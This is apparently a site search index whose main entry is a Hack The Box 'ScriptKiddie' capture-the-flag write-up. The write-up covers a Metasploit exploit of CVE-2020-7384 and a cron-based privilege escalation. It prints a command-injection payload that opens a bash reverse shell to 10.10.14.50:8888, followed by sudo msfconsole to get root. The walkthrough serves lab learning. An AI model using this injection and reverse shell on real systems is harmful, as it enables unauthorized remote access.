[{"body":"Here lives all the documentations! ","categories":"","description":"","excerpt":"Here lives all the documentations! ","ref":"/docs/","tags":"","title":"Documentation"},{"body":"","categories":"","description":"Repository of Hack The Box writeups.\n","excerpt":"Repository of Hack The Box writeups.\n","ref":"/docs/capture-the-flag/hack-the-box/","tags":"","title":"Hack The Box Writeups"},{"body":"\nScript Kiddie!\nWhat is the author (0xdf) implying to us?\nA box for script kiddies?\nOr is it a box for us to stand out from the script kiddies?\nMy guess would be the latter‚Ä¶\nKeep in mind, the destination (root.txt) is not what‚Äôs important, it‚Äôs the journey (every line that got us to root.txt) that counts.\nWith that said, let‚Äôs begin!\nEnumeration Nmap scan reveals Werkzeug httpd 0.16.1 (Python 3.8.5) running on port 5000.\nQuite a few options are available to play with‚Ä¶ Nmap, Msfvenom, Searchsploit‚Ä¶\nThe Werkzeug module available from Metasploit will spawn a Python shell, provided if we had access to a Werkzeug debug console. But since we don‚Äôt, this exploit is unusable for us.\nExploitation The exploit we are using is CVE-2020‚Äì7384, one that leverages the mishandling of apk files by Msfvenom to grant us a reverse shell.\nWe‚Äôll start by configuring the necessary parameters in Metasploit.\nSetting up Netcat listener on port 4444.\nWith the os set as Android, lhost set as some funny ip, we can proceed to upload the APK.\nVoila! And we‚Äôve got user access to the machine.\nPrivilege Escalation /home/pwn/scanlosers.sh\nhome/kid/logs/hackers\nThere‚Äôs an interesting script scanlosers.sh, within user directory of pwn, but we (the kid user) unfortunately only have read access to it.\nThat said, since it takes in input from the hackers file, which we is owned by us (kid). Thus, scanlosers.sh is still accessible by us in some ways.\nAfter writing some random stuff into hackers, but the file seems to remain empty. It brought up suspicion that a cronjob of scanlosers.sh was running, as the last line of scanlosers.sh - echo -n \u003e $log will clear the hackers file.\nFirst Shell: echoing hello into hackers\nSecond Shell: running pspy64, catches the cronjob of our payload hello\nTo confirm our suspicion, we will use pspy, a command line tool designed for snooping on commands run by other users, cron jobs, etc.\nI have downloaded the 64-bit binary version and used nc to transfer the binary over to the Script Kiddie machine. (feel free to skip this step or try it out for yourself)\nInitiate two reverse shells. The first shell runs our test payload hello The second shell runs the pspy64 binary, and was able to catch the details of the cronjob. Indeed, we are able to confirm a cronjob was running in the background, meaning that /home/pwn/scanlosers.sh will be executed for each time /home/kid/log/hackers is being altered.\nSome explanations, our payload is basically a Bash TCP Shell. Description for each gate from scanlosers.sh are as following:\nRemove tuna and salmon. Sort our payload if it has more than one line, since we don‚Äôt, we‚Äôre good. Stores our payload into the ip variable. When our payload is parsed and executed, they will be run as:\nsh -c ‚Äúnmap --top-ports 10 -oN recon/;\nDoesn‚Äôt do anything since it is an incomplete nmap command, no ip address is supplied. /bin/bash -c ‚Äòbash -i \u003e\u0026/dev/tcp/10.10.14.50/8888 0\u003e\u00261‚Äô\nThe Bash TCP Shell we need! #.nmap ${ip} 2\u003e\u00261 \u003e/dev/null‚Äù \u0026...\nUsing the # to comment out everything else Setting up Netcat listener on port 8888.\nMoment of Truth!\nWriting our payload into hackers.\necho ‚Äútuna salmon ;/bin/bash -c ‚Äòbash -i \u003e\u0026/dev/tcp/10.10.14.50/8888 0\u003e\u00261‚Äô #‚Äù \u003e\u003e hackers\nAfter having logged in as pwn, with sudo -l we found out that we are able to run msfconsole as root without the need of password.\nNow let‚Äôs run msfconsole as sudo.\nsudo /opt/metasploit-framework-6.0.9/msfconsole\nJackpot!\nAnd there we have it!\nAfterthoughts Overall, ScriptKiddie teaches the basic yet core concepts of the HTB platform:\nMetasploit Cronjobs Bash scripting sudo -l It is one box that should definitely be recommend for the newcomers!\n","categories":["ctf"],"description":"","excerpt":"\nScript Kiddie!\nWhat is the author (0xdf) implying to us?\nA box for ‚Ä¶","ref":"/docs/capture-the-flag/hack-the-box/script-kiddie/","tags":["htb"],"title":"Script Kiddie Writeup"},{"body":"","categories":"","description":"Repository of Mikrotik related articles.\n","excerpt":"Repository of Mikrotik related articles.\n","ref":"/docs/networking/mikrotik/","tags":"","title":"Mikrotik"},{"body":"","categories":"","description":"Repository of networking related articles.\n","excerpt":"Repository of networking related articles.\n","ref":"/docs/networking/","tags":"","title":"All Things Networking Related"},{"body":"","categories":"","description":"Repository of CTF writeups. The main goal of this section is to **look beyond CTF as sport activities, and to relate them with actual flaws in production environment**.\n","excerpt":"Repository of CTF writeups. The main goal of this section is to **look ‚Ä¶","ref":"/docs/capture-the-flag/","tags":"","title":"CTF Writeups"},{"body":"","categories":"","description":"","excerpt":"","ref":"/categories/","tags":"","title":"Categories"},{"body":"","categories":"","description":"","excerpt":"","ref":"/categories/ctf/","tags":"","title":"ctf"},{"body":"","categories":"","description":"","excerpt":"","ref":"/tags/htb/","tags":"","title":"htb"},{"body":"","categories":"","description":"","excerpt":"","ref":"/tags/","tags":"","title":"Tags"},{"body":" About Myself Past Experiences ","categories":"","description":"","excerpt":" About Myself Past Experiences ","ref":"/about/","tags":"","title":"About Myself"},{"body":"","categories":"","description":"","excerpt":"","ref":"/blog/","tags":"","title":"Bits and Pieces of Life!"},{"body":" Foreword Hello there, thanks for dropping by and welcome!\nMy objective of building this site is to promote knowledge sharing across all levels. Suggestions and feedback are most welcomed! üòÉ\nFeel free to explore around, learn things, and use it to build your own projects!\nAs always, my life goal has been clear to myself and it is to fight against extreme poverty, with my own hands, knowledge, hard-earned assets, and ultimately - with technology itself!\nLive towards your goal. Live without regrets. Live life to the fullest!\n","categories":"","description":"","excerpt":" Foreword Hello there, thanks for dropping by and welcome!\nMy ‚Ä¶","ref":"/","tags":"","title":"Sam Docs"}]